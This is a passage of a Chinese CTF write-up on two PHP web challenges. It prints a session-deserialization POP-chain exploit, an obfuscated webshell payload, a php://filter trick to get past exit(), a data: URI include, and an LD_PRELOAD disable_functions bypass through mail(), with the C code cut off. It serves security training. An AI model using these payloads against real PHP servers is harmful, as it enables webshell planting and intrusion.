class="hljs-string">&quot;Who care about it?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;dumb-&gt;silly();<br>    &#125;<br>&#125;<br><span class="hljs-variable">$Neepu</span> = <span class="hljs-keyword">new</span> neepu();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$Neepu</span>-&gt;checkinfo();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>读取<code>config/backdoor.php</code>，发现是个后门写入，但是只能通过一些特殊字符组成<code>webshell</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span><br>        <span class="hljs-comment">//! eval code</span><br>        <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[;+=!@\$\&quot;\.\_\(\)\[\]]&#123;1,&#125;/i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;cmd)) &#123;<br>            file_put_contents(<span class="hljs-string">&quot;/var/www/html/neepu.php&quot;</span>, <span class="hljs-string">&quot;&lt;?php &quot;</span>.<span class="hljs-keyword">$this</span>-&gt;cmd);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;A webshell is waiting for you&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>整合一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config/backdoor.php&quot;</span>;<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">neepu</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span><br>        <span class="hljs-comment">//! Neepu</span><br>        <span class="hljs-variable">$neepu</span>,<br>        <span class="hljs-comment">//! Memory-held data</span><br>        <span class="hljs-variable">$data</span>,<br>        <span class="hljs-comment">//! Info</span><br>        <span class="hljs-variable">$info</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;neepu = <span class="hljs-string">&quot;&lt;h1&gt;Welcome to serialize club :)&lt;/h1&gt;&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>] = <span class="hljs-string">&quot;&lt;h1&gt;This is PHPINFO&lt;/h1&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkinfo</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;info&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;neepu;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>];<br>            phpinfo();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;neepu;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>]-&gt;data;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Neepu!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">n33pu</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! Neepu object</span><br>        <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-variable">$Neepu</span> = <span class="hljs-keyword">$this</span>-&gt;obj;<br>        <span class="hljs-keyword">return</span> serialize(<span class="hljs-variable">$Neepu</span>);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dumb</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! dumb</span><br>        <span class="hljs-variable">$dumb</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">silly</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Who care about it?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;dumb-&gt;silly();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span><br>        <span class="hljs-comment">//! eval code</span><br>        <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[;+=!@\$\&quot;\.\_\(\)\[\]]&#123;1,&#125;/i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;cmd)) &#123;<br>            file_put_contents(<span class="hljs-string">&quot;/var/www/html/neepu.php&quot;</span>, <span class="hljs-string">&quot;&lt;?php &quot;</span>.<span class="hljs-keyword">$this</span>-&gt;cmd);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;A webshell is waiting for you&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$Neepu</span> = <span class="hljs-keyword">new</span> neepu();<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$Neepu</span>-&gt;checkinfo();<br></code></pre></td></tr></table></figure><p>先POST一个<code>info</code>查看<code>phpinfo</code>：</p><p><img src="https://woshilnp.github.io/wzimg/281.png" alt="a"></p><p>这里使用两个引擎来分别处理就存在SESSION反序列化漏洞</p><p>因为我们需要使用这个后门，就需要调用到<code>__invoke</code>魔术方法，就需要构造POP链</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">class</span> silly -&gt;</span> __destruct<br>↓↓↓<br><span class="hljs-function"><span class="hljs-title">class</span> neepu -&gt;</span> __<span class="hljs-function"><span class="hljs-title">call</span> -&gt;</span> 建立neepu对象echo触发__toString<br>↓↓↓<br><span class="hljs-function"><span class="hljs-title">class</span> neepu -&gt;</span> __<span class="hljs-function"><span class="hljs-title">toString</span> -&gt;</span> 建立n33pu对象访问不存在的变量触发__get<br>↓↓↓<br><span class="hljs-function"><span class="hljs-title">class</span> n33pu -&gt;</span> __<span class="hljs-function"><span class="hljs-title">get</span> -&gt;</span> $N<span class="hljs-function"><span class="hljs-title">eepu</span>() -&gt;</span> 建立backdoor对象以函数形式调用backdoor对象触发__invoke<br>↓↓↓<br><span class="hljs-function"><span class="hljs-title">class</span> backdoor -&gt;</span> __<span class="hljs-function"><span class="hljs-title">invoke</span> -&gt;</span> 写入 webshell<br></code></pre></td></tr></table></figure><p>EXP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">neepu</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! Memory-held data</span><br>        <span class="hljs-variable">$data</span>,<br>        <span class="hljs-comment">//! Neepu</span><br>        <span class="hljs-variable">$neepu</span>,<br>        <span class="hljs-comment">//! Info</span><br>        <span class="hljs-variable">$info</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>] = <span class="hljs-keyword">new</span> n33pu();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">n33pu</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! Neepu func</span><br>        <span class="hljs-variable">$func</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">backdoor</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! eval code</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;$_=[];$_=@&quot;$_&quot;;$_=$_[&quot;!&quot;==&quot;@&quot;];$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__++;$__++;$____=&quot;_&quot;;$____.=$__;$____.=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$_[_]($_[__]);&#x27;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dumb</span> </span>&#123;<br>    <span class="hljs-keyword">public</span><br>        <span class="hljs-comment">//! dumb</span><br>        <span class="hljs-variable">$dumb</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> backdoor();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> neepu();<br><span class="hljs-variable">$b</span>-&gt;neepu = <span class="hljs-keyword">new</span> neepu();<br><span class="hljs-variable">$b</span>-&gt;neepu-&gt;info[<span class="hljs-string">&#x27;info&#x27;</span>]-&gt;func = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> dumb();<br><span class="hljs-variable">$c</span>-&gt;dumb = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$z</span> = serialize(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;|&#x27;</span>.str_replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>, <span class="hljs-variable">$z</span>);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">|O:4:\&quot;dumb\&quot;:1:&#123;s:4:\&quot;dumb\&quot;;O:5:\&quot;neepu\&quot;:3:&#123;s:4:\&quot;data\&quot;;N;s:5:\&quot;neepu\&quot;;O:5:\&quot;neepu\&quot;:3:&#123;s:4:\&quot;data\&quot;;N;s:5:\&quot;neepu\&quot;;N;s:4:\&quot;info\&quot;;a:1:&#123;s:4:\&quot;info\&quot;;O:5:\&quot;n33pu\&quot;:1:&#123;s:4:\&quot;func\&quot;;O:8:\&quot;backdoor\&quot;:1:&#123;s:3:\&quot;cmd\&quot;;s:230:\&quot;$_=[];$_=@\&quot;$_\&quot;;$_=$_[\&quot;!\&quot;==\&quot;@\&quot;];$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__++;$__++;$____=\&quot;_\&quot;;$____.=$__;$____.=$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$_[_]($_[__]);\&quot;;&#125;&#125;&#125;&#125;s:4:\&quot;info\&quot;;a:1:&#123;s:4:\&quot;info\&quot;;O:5:\&quot;n33pu\&quot;:1:&#123;s:4:\&quot;func\&quot;;N;&#125;&#125;&#125;&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>为了防止双引号被转义，在双引号前加上 <code>\</code>，除此之外还要加上 <code>|</code></p><p>构造一个上传数据的页面<code>upload.html</code></p><p>为什么能构造一个前端的东西上传东西呢，我之前也遇到过，查了下，是因为</p><p><img src="https://woshilnp.github.io/wzimg/282.png" alt="a"></p><p>由<code>phpinfo()</code>页面知，<code>session.upload_progress.enabled</code>为On。当一个上传在处理中，同时POST一个与INI中设置的<code>session.upload_progress.name</code>同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过<code>Session Upload Progress</code>来设置<code>session</code>。</p><p>所以可以在前端构造<code>upload.html</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://neepusec.club:18930/index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后抓包修改<code>filename</code></p><p><img src="https://woshilnp.github.io/wzimg/283.png" alt="a"></p><p><img src="https://woshilnp.github.io/wzimg/284.png" alt="a"></p><p><code>getshell</code>以后访问<code>neepu.php</code>，之前在<code>phpinfo</code>里发现还有<code>passthru</code>可以使用</p><p>但是在根目录没有发现<code>flag</code>，猜测在<code>/root</code>里面，需要我们<code>SUID</code>提权</p><p>详情参考：</p><p><code>https://www.anquanke.com/post/id/242237#h3-13</code></p><h3 id="upload-club"><a href="#upload-club" class="headerlink" title="upload_club"></a>upload_club</h3><p>知识点：</p><p> 数组<code>[</code>解析变量名：</p><p>通过<code>[</code> 来使得<code>php</code>认为传入的是数组从而绕过 <code>.</code> 变成 <code>_</code> 的转换</p><p>二次编码绕过：</p><p>其实就是因为<code>file_put_contents</code>经过伪代码处理只进行了一次<code>url</code>加密，</p><p>过滤器绕死亡函数<code>exit</code>：</p><p>参考<code>https://woshilnp.github.io/2021/05/23/详解php-filter以及死亡绕过</code></p><p><code>file_get_contents</code> 与 <code>require_once</code> 的 <code>Data URL</code> 识别：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">file_get_contents</span> 允许使用 <span class="hljs-class"><span class="hljs-keyword">data</span> <span class="hljs-type">URI</span>，会直接返回后面的内容，很奇怪的是，在 allow_url_include=<span class="hljs-type">Off</span> 的情况下，不允许 require_once <span class="hljs-keyword">data</span> <span class="hljs-type">URI</span> 的，但是如果 `<span class="hljs-keyword">data</span>:,<span class="hljs-type">XXX</span>` 是一个目录名的话，就会放开限制。</span><br></code></pre></td></tr></table></figure><p>测试效果如下：</p><p><img src="https://woshilnp.github.io/wzimg/276.png" alt="a"></p><p><code>df</code>绕过：</p><p>用 mail() 函数 绕过</p><blockquote><p>PHP 的 <code>mail()</code> 函数调用 <code>execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], ...)</code> 。由于这种实现，如果我们使用自写动态库设置环境变量 <code>LD_PRELOAD</code> ，从而修改 <code>/bin/sh</code> 的行为并获得命令执行。</p></blockquote><p>解题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;title&gt;neepu_sec.club&lt;/title&gt;<br>&lt;body background=<span class="hljs-string">&quot;bg.jpg&quot;</span>&gt;<br>&lt;font color=<span class="hljs-string">&quot;green&quot;</span>&gt;&lt;h1&gt;Welcome to neepu sec club, <span class="hljs-keyword">try</span> to upload your content :)&lt;/h1&gt;&lt;/font&gt;<br>&lt;font size = <span class="hljs-number">5</span>&gt;&lt;p&gt;Here is &lt;a href=<span class="hljs-string">&quot;source.php&quot;</span>&gt;source&lt;/a&gt; <span class="hljs-keyword">and</span> &lt;a href=<span class="hljs-string">&quot;uploads/sample/sample.txt&quot;</span>&gt;sample&lt;/a&gt;&lt;/p&gt;&lt;/font&gt;<br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$uploadclub</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]));<br><span class="hljs-variable">$uploadclub</span> = basename(str_replace([<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;`&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>],[<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>], <span class="hljs-variable">$uploadclub</span>));<br>@mkdir(<span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-variable">$uploadclub</span>);<br>@chdir(<span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-variable">$uploadclub</span>);<br>print_r(<span class="hljs-string">&quot;Upload: uploads/&quot;</span>.<span class="hljs-variable">$uploadclub</span>);<br><span class="hljs-variable">$check</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/25/&#x27;</span>, <span class="hljs-variable">$check</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;No more 25 :(&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    extract(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;neepu_sec.club&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|zlib|string|tripledes|ini|htaccess|\\|#|\&lt;\?/i&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;br /&gt;hacker!!!&#x27;</span>);<br>    &#125;<br>    <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;neepu&#x27;</span>,<span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-string">&#x27;.phtml&#x27;</span>,<span class="hljs-string">&#x27;neepu&#x27;</span>,<span class="hljs-variable">$content</span>);<br>    file_put_contents(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span>.<span class="hljs-variable">$content</span>);<br>    chdir(<span class="hljs-string">&#x27;..&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!stripos(file_get_contents(<span class="hljs-variable">$content</span>),<span class="hljs-string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !stripos(file_get_contents(<span class="hljs-variable">$content</span>),<span class="hljs-string">&#x27;php&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$content</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    chdir(<span class="hljs-keyword">__DIR__</span>);<br>    @rmdir(<span class="hljs-string">&#x27;uploads/&#x27;</span>.<span class="hljs-variable">$uploadclub</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>通过上面知识点可以写入并包含 shell 文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># phpinfo()</span><br><span class="hljs-attribute">neepu</span>[sec.club=php://filter/write=convert.%<span class="hljs-number">6</span>%<span class="hljs-number">39</span>conv.%<span class="hljs-number">5</span>%<span class="hljs-number">35</span>CS-<span class="hljs-number">2</span>LE.%<span class="hljs-number">5</span>%<span class="hljs-number">35</span>CS-<span class="hljs-number">2</span>BE|?%<span class="hljs-number">3</span>Chp%<span class="hljs-number">20</span>phpipfn(o;)%<span class="hljs-number">3</span>E?/resource=w<span class="hljs-number">0</span>s<span class="hljs-number">1</span>np<br><span class="hljs-attribute">X</span>-Forwarded-For: data:,<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure><p>然后再包含该文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">neepu</span>[sec.club=data:,<span class="hljs-number">123456</span>/w<span class="hljs-number">0</span>s<span class="hljs-number">1</span>np<br></code></pre></td></tr></table></figure><p>查看 disable_functions</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">passthru,exec,system,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv,chmod,posix_mkfifo,pg_lo_import,dbmopen,dbase_open,define_syslog_variables,posix_getpwuid,posix_uname,proc_close,pclose,proc_nice,proc_terminate,curl_exec,curl_multi_exec,parse_ini_file,show_source,fopen,copy,rename,readfile,tmpfile,tempnam,touch,link,file,ftp_connect,ftp_ssl_connect<br></code></pre></td></tr></table></figure><p>用 mail() 函数 绕过</p><blockquote><p>PHP 的 <code>mail()</code> 函数调用 <code>execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], ...)</code> 。由于这种实现，如果我们使用自写动态库设置环境变量 <code>LD_PRELOAD</code> ，从而修改 <code>/bin/sh</code> 的行为并获得命令执行。</p></blockquote><p>即使 <code>/usr/sbin/sendmail</code> 不存在，也可以使用，重写 <code>getuid()</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 